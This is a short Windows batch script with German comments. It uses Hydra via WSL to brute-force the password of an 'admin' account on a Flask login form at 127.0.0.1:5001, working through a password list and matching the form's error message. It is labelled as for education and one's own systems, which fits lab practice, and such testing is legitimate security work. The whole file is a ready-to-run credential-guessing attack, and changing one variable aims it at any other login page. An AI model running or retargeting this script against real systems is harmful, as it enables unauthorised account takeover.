@echo off
REM ============================================
REM Hydra Bruteforce für Flask Login (Windows)
REM ============================================
REM WICHTIG: Nur für Bildungszwecke und eigene Systeme!
REM
REM Installation:
REM   1. Installiere WSL (Windows Subsystem for Linux)
REM   2. In WSL: sudo apt-get install hydra
REM   3. Führe dieses Skript aus
REM ============================================

SET TARGET=127.0.0.1
SET PORT=5001
SET USERNAME=admin
SET PASSWORD_FILE=passwords.txt
SET LOGIN_PATH=/login
SET FAIL_STRING=Ungültige Eingabedaten

echo ========================================
echo Hydra Bruteforce Attack gestartet
echo ========================================
echo Target: http://%TARGET%:%PORT%%LOGIN_PATH%
echo Username: %USERNAME%
echo Password-Liste: %PASSWORD_FILE%
echo.

REM Prüfe ob Hydra verfügbar ist (via WSL)
wsl which hydra >nul 2>&1
if %ERRORLEVEL% NEQ 0 (
    echo FEHLER: Hydra nicht gefunden!
    echo Bitte installiere Hydra in WSL:
    echo    wsl sudo apt-get install hydra
    pause
    exit /b 1
)

REM Konvertiere Windows-Pfad zu WSL-Pfad
SET WSL_PASSWORD_FILE=%PASSWORD_FILE%

REM Führe Hydra via WSL aus
wsl hydra -l %USERNAME% -P %WSL_PASSWORD_FILE% -V -f %TARGET% -s %PORT% http-post-form "%LOGIN_PATH%:username=^USER^&password=^PASS^:%FAIL_STRING%"

echo.
echo ========================================
echo Hydra Bruteforce beendet
echo ========================================
pause
